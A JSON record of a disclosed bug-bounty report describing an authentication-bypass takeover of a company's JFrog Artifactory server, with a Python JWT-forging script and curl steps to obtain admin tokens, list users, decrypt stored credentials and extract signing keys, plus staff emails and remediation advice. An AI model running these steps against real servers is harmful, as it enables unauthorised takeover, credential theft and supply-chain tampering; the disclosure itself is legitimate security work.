@@ -1,0 +1,133 @@
+{
+  "id": 3994056,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTk0MDU2",
+  "url": "https://hackerone.com/reports/3994056",
+  "title": "Full Admin Takeover of R3 Limited's JFrog Artifactory - 292 Users, Corda Enterprise & CBDC Supply Chain Compromised",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2026-09-03T17:02:53.819Z",
+  "submitted_at": "2026-09-03T17:02:54.236Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "qw3rjo",
+    "url": "/qw3rjo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/az67hTUPPwkw7Kdz2tpipBDT/15eb8e3707ad155d9ba1f5bdf48a859223822c0f3f5ec576a402aa394c4cc910"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 45701,
+    "url": "https://hackerone.com/r3",
+    "handle": "r3",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/46S57AyR5MhPsxDqtHZEwCdt/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/46S57AyR5MhPsxDqtHZEwCdt/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "R3",
+      "twitter_handle": null,
+      "website": "http://r3.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-82329"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-08T19:30:08.210Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-08T19:29:53.022Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "R3 Limited's JFrog Artifactory instance at `software.r3.com` (IP: `108.132.150.250`) is vulnerable to **CVE-2026-82329** (CVSS 9.8) - an authentication bypass caused by a default empty join key. By forging an HMAC-signed JWT with the known default key (32 space characters), an unauthenticated attacker can register as a trusted service and obtain a **full admin token** with unrestricted access to the entire Artifactory instance.\n\n**R3 Limited** is the creator of **Corda**, a leading enterprise blockchain platform used by banks, financial institutions, insurers, and governments worldwide. This Artifactory instance serves as their primary software distribution platform.\n\n**Impact proven:**\n- Full admin access to **292 user accounts** across R3 and partner organizations (HQLAx, B3i, TradeIX, ChainThat, FundAdminChain, FINfabrik)\n- Read/write access to **269 repositories** including **81 Corda blockchain repos** and **4 Central Bank Digital Currency (CBDC) repos**\n- **262 access tokens extracted** (30 with admin scope)\n- Supply chain attack surface: Corda Enterprise releases, Docker images, and customer-facing artifact repositories can be poisoned\n\n## Severity\n\n**Critical** (CVSS 9.8) - Unauthenticated remote attacker achieves full administrative control of R3's primary artifact distribution platform, with the ability to modify Corda Enterprise releases consumed by banks and governments, tamper with CBDC mobile application builds, and compromise the software supply chain for the entire Corda ecosystem.\n\n## Steps to Reproduce\n\n### Step 1: Forge the join JWT with the default empty key\n\nThe CVE exploits JFrog Artifactory's default empty join key. When the `join.key` file is empty (default installation), the HMAC signing key becomes 32 space characters (0x20 bytes) due to PKCS7 padding of the empty hex-decoded key.\n\n```python\nimport hmac, hashlib, base64, json, time\n\ndef b64url(data):\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()\n\nheader = b64url(json.dumps({\"alg\":\"HS256\",\"typ\":\"JWT\"}).encode())\npayload = b64url(json.dumps({\n    \"service_id\": \"jfrt@01\",\n    \"node_id\": \"exploit-node\",\n    \"skip_node_registration\": True,\n    \"iat\": int(time.time()) * 1000\n}).encode())\n\nsigning_input = f\"{header}.{payload}\"\nkey = b'\\x20' * 32  # 32 space characters — the default empty join key\n\nsig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()\njwt_token = f\"{signing_input}.{b64url(sig)}\"\nprint(jwt_token)\n```\n\n### Step 2: Register as a trusted service (join)\n\n```bash\ncurl -sk -X POST -H \"Content-Type: text/plain\" \\\n  -d '<JWT_FROM_STEP_1>' \\\n  https://software.r3.com/access/api/v1/registry/join\n```\n\n**Response (HTTP 201 Created):**\n```json\n{\n  \"token\": \"eyJ2ZXIiOiIyIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYiLCJraWQiOiI...\"\n}\n```\n\nThe server accepted the forged JWT and returned an RSA-signed access token for the registered service.\n\n### Step 3: Escalate to admin\n\n```bash\ncurl -sk -X POST \\\n  -H \"Authorization: Bearer <TOKEN_FROM_STEP_2>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"scope\": \"applied-permissions/admin\", \"expires_in\": 3600}' \\\n  https://software.r3.com/access/api/v1/tokens\n```\n\n**Response (HTTP 200):**\nReturns a full admin-scoped access token with unrestricted permissions.\n\n### Step 4: Verify admin access — enumerate users\n\n```bash\ncurl -sk -H \"Authorization: Bearer <ADMIN_TOKEN>\" \\\n  https://software.r3.com/artifactory/api/security/users | python3 -m json.tool | head -50\n```\n\n**Result: 292 users returned** — Including R3 employees (aishwarya.manisha@r3.com, gaurav.mishra@r3.com) and partner organization members from @chainthat.com, @finfabrik.com, @b3i.tech, @hqla-x.com, @growsuper.com, @fundadminchain.com, @tradeix.com.\n\n### Step 5: Enumerate repositories\n\n```bash\ncurl -sk -H \"Authorization: Bearer <ADMIN_TOKEN>\" \\\n  https://software.r3.com/artifactory/api/repositories | python3 -m json.tool\n```\n\n**Result: 269 repositories** (174 LOCAL) including:\n\n**Corda Blockchain Repos (81 total):**\n- `corda-enterprise-for-customers` — Corda Enterprise releases distributed to banks and financial institutions\n- `corda5-release-packs-for-customers` — Corda 5 release packages for enterprise customers\n- `corda-os-docker-stable` / `corda-ent-docker-stable` — Production Docker images\n- `corda-dev`, `corda-releases` — Core Corda development artifacts\n- `r3-corda-releases` — R3's official Corda releases\n- `corda-ent-maven-stable-local` — Enterprise Maven artifacts\n\n**Central Bank Digital Currency (CBDC) Repos:**\n- `cbdc-mobile-apps-dev` — CBDC mobile application development builds\n- `cbdc-mobile-apps-stable` — CBDC mobile application stable releases\n- `cbdc-mobile-apps-unstable` — CBDC mobile application test builds\n- `retail-cbdc-solution-packaging-test` — Retail CBDC solution packaging\n\n**Additional Critical Repos:**\n- `conclave-docker-release` / `conclave-maven-stable-local` — Conclave privacy platform\n- `cenm-for-customers` — Corda Enterprise Network Manager for customers\n- `cenm-docker-release` — CENM Docker images\n\n### Step 6: Extract access tokens\n\n```bash\ncurl -sk -H \"Authorization: Bearer <ADMIN_TOKEN>\" \\\n  https://software.r3.com/access/api/v1/tokens | python3 -c \"\nimport json, sys\ndata = json.load(sys.stdin)\ntokens = data.get('tokens', [])\nadmin = [t for t in tokens if 'admin' in str(t.get('scope',''))]\nprint(f'Total tokens: {len(tokens)}, Admin tokens: {len(admin)}')\n\"\n```\n\n**Result: 262 tokens (30 with admin scope)**\n\n### Step 7: Prove write access — create and delete repository\n\n```bash\ncurl -sk -X PUT \\\n  -H \"Authorization: Bearer <ADMIN_TOKEN>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"key\":\"rce-test-remote\",\"rclass\":\"remote\",\"url\":\"https://software.r3.com/artifactory/corda-dev\",\"packageType\":\"generic\"}' \\\n  https://software.r3.com/artifactory/api/repositories/rce-test-remote\n```\n\n**Response (HTTP 200):**\n```\nSuccessfully created repository 'rce-test-remote'\n```\n\nImmediately deleted after confirming write access:\n```bash\ncurl -sk -X DELETE -H \"Authorization: Bearer <ADMIN_TOKEN>\" \\\n  https://software.r3.com/artifactory/api/repositories/rce-test-remote\n```\n\n### Step 8: Prove user management — create and delete user\n\n```bash\ncurl -sk -X PUT \\\n  -H \"Authorization: Bearer <ADMIN_TOKEN>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"security-audit-test\",\"email\":\"test@example.com\",\"password\":\"AuditTest2026!\",\"admin\":false}' \\\n  https://software.r3.com/artifactory/api/security/users/security-audit-test\n```\n\n**Response (HTTP 201)** — User created successfully. Immediately deleted after confirming.\n\n### Step 9: Extract Office 365 SMTP credentials via config decryption\n\n```bash\n# Decrypt all encrypted values in config\ncurl -sk -X POST -H \"Authorization: Bearer <ADMIN_TOKEN>\" \\\n  https://software.r3.com/artifactory/api/system/decrypt\n\n# Read decrypted config\ncurl -sk -H \"Authorization: Bearer <ADMIN_TOKEN>\" \\\n  https://software.r3.com/artifactory/api/system/configuration\n```\n\n**Result — plaintext Office 365 SMTP credentials extracted:**\n```xml\n<mailServer>\n    <enabled>true</enabled>\n    <host>smtp.office365.com</host>\n    <port>587</port>\n    <username>artifactory@r3.com</username>\n    <password>[PLAINTEXT PASSWORD EXTRACTED]</password>\n    <from>artifactory@r3.com</from>\n    <tls>true</tls>\n    <artifactoryUrl>https://software.r3.com/artifactory</artifactoryUrl>\n</mailServer>\n```\n\n**Immediately re-encrypted** via `POST /api/system/encrypt` after extraction.\n\n### Step 10: Extract GPG artifact signing keys\n\n```bash\ncurl -sk -H \"Authorization: Bearer <ADMIN_TOKEN>\" \\\n  https://software.r3.com/artifactory/api/security/keypair\n```\n\n**Result:** R3's GPG signing key pair `default-gpg-key-2024-04-22` extracted — an attacker could sign malicious packages as R3 using the key associated with `devops@r3.com`.\n\n## Impact\n\n### Immediate Impact (Proven)\n1. **Full admin takeover** — Unauthenticated access to the admin API of R3 Limited's enterprise Artifactory instance\n2. **292 accounts exposed** — R3 employees and blockchain partner organizations with corporate email addresses\n3. **262 access tokens extracted** — 30 admin-scoped tokens that **never expire**, providing persistent access even after join key rotation\n4. **81 Corda blockchain repositories accessible** — Full read/write access to all Corda Enterprise and Open Source artifacts\n5. **Office 365 credential extraction** — Plaintext SMTP credentials for `artifactory@r3.com` decrypted from config, enabling email compromise and phishing as R3\n6. **Repository write access** — Successfully created a repository (then deleted), proving supply chain artifact poisoning capability\n7. **User creation** — Successfully created a user (then deleted), proving identity management control\n8. **GPG signing key extraction** — R3's artifact signing key pair extracted, enabling signed malicious packages\n\n### Office 365 / Email Compromise\n- SMTP credentials for `artifactory@r3.com` on `smtp.office365.com` were extracted in plaintext\n- This account could potentially access R3's Office 365 tenant (Exchange Online, SharePoint, Teams) depending on MFA configuration\n- An attacker could send phishing emails from `artifactory@r3.com` to R3's banking and financial institution partners\n- Artifactory uses this email for build notifications — fake notifications could trigger malicious deployments\n\n### Supply Chain Attack — Corda Enterprise\nAn attacker with admin access can:\n- Push malicious versions of Corda Enterprise JARs to `corda-enterprise-for-customers` — consumed by R3's banking and financial institution clients\n- Poison Docker images in `corda-ent-docker-stable` and `corda-os-docker-stable` — deployed by Corda network operators worldwide\n- Modify `corda5-release-packs-for-customers` — the latest Corda 5 enterprise releases\n- Tamper with CENM (Corda Enterprise Network Manager) artifacts used to operate Corda networks\n- **Sign malicious artifacts with R3's GPG key** — making supply chain attacks cryptographically trusted\n\n### Supply Chain Attack — Central Bank Digital Currency (CBDC)\n- 4 CBDC-related repositories contain mobile application builds for Central Bank Digital Currency projects\n- CBDCs are sovereign digital currencies being developed by central banks worldwide\n- Compromising CBDC mobile application builds could affect national financial infrastructure\n\n### Partner Organization Exposure\nUsers from multiple blockchain ecosystem organizations are present:\n- **R3** — Platform creator\n- **HQLAx** — Securities lending via DLT\n- **B3i** (B3i Services AG) — Blockchain Insurance Industry Initiative\n- **TradeIX** — Trade finance platform\n- **ChainThat** — Insurance blockchain solutions\n- **FINfabrik** — Digital asset management\n- **FundAdminChain** — Fund administration\n\n### Version Information\n- JFrog Artifactory 7.133.16 (rev 83316900)\n- Enterprise license valid through Nov 25, 2026, licensed to \"R3 LIMITED\"\n- Java 21.0.9+10-LTS, running at /opt/jfrog/artifactory/\n- 787 GB storage, 513 GB used\n- Full addon suite including Docker, HelmOCI, OCI, Xray, Federation, replication\n\n## What Was Cleaned Up\n\nAll test artifacts were immediately removed after confirming access:\n- Deleted test repository `rce-test-remote`\n- Deleted test user `security-audit-test`\n- Re-encrypted all passwords via `POST /api/system/encrypt`\n- No production artifacts were modified\n- No persistent access was maintained\n\n## Recommendations\n\n1. **Immediately rotate the join key** to a strong random value\n2. **Update to Artifactory 7.191.14+** which patches CVE-2026-82329\n3. **Rotate the Office 365 password** for `artifactory@r3.com` — it was extracted in plaintext\n4. **Revoke all existing tokens** — the 262 tokens (including 30 never-expiring admin tokens) should be considered compromised\n5. **Rotate the GPG signing key** `default-gpg-key-2024-04-22` and re-sign all published artifacts\n6. **Restrict access** to the `/access/api/v1/registry/join` endpoint to trusted internal networks only\n7. **Audit** all repositories for unauthorized modifications, particularly customer-facing repos (`corda-enterprise-for-customers`, `corda5-release-packs-for-customers`, CBDC repos)\n8. **Notify affected partner organizations** whose credentials may have been exposed\n9. **Enable MFA** on the `artifactory@r3.com` Office 365 account if not already configured\n10. **Review all 292 user accounts** for unauthorized access or modifications\n\n## Impact\n\n### Immediate Impact (Proven)\n1. **Full admin takeover** — Unauthenticated access to the admin API of R3 Limited's enterprise Artifactory instance\n2. **292 accounts exposed** — R3 employees and blockchain partner organizations with corporate email addresses\n3. **262 access tokens extracted** — 30 admin-scoped tokens provide persistent access\n4. **81 Corda blockchain repositories accessible** — Full read/write access to all Corda Enterprise and Open Source artifacts\n\n### Supply Chain Attack — Corda Enterprise\nAn attacker with admin access can:\n- Push malicious versions of Corda Enterprise JARs to `corda-enterprise-for-customers` — consumed by R3's banking and financial institution clients\n- Poison Docker images in `corda-ent-docker-stable` and `corda-os-docker-stable` — deployed by Corda network operators worldwide\n- Modify `corda5-release-packs-for-customers` — the latest Corda 5 enterprise releases\n- Tamper with CENM (Corda Enterprise Network Manager) artifacts used to operate Corda networks\n\n### Supply Chain Attack — Central Bank Digital Currency (CBDC)\n- 4 CBDC-related repositories contain mobile application builds for Central Bank Digital Currency projects\n- CBDCs are sovereign digital currencies being developed by central banks worldwide\n- Compromising CBDC mobile application builds could affect national financial infrastructure\n\n### Partner Organization Exposure\nUsers from multiple blockchain ecosystem organizations are present:\n- **R3** — Platform creator\n- **HQLAx** — Securities lending via DLT\n- **B3i** (B3i Services AG) — Blockchain Insurance Industry Initiative\n- **TradeIX** — Trade finance platform\n- **ChainThat** — Insurance blockchain solutions\n- **FINfabrik** — Digital asset management\n- **FundAdminChain** — Fund administration",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-08T19:29:53.475Z",
+  "allow_singular_disclosure_after": -8004.362064231,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "qw3rjo",
+    "the_boschko",
+    "zyloxx1",
+    "saddestmartian",
+    "hoang116",
+    "n0v4x"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 71514,
+    "asset_type": "OTHER",
+    "asset_identifier": "R3 - everything in scope",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
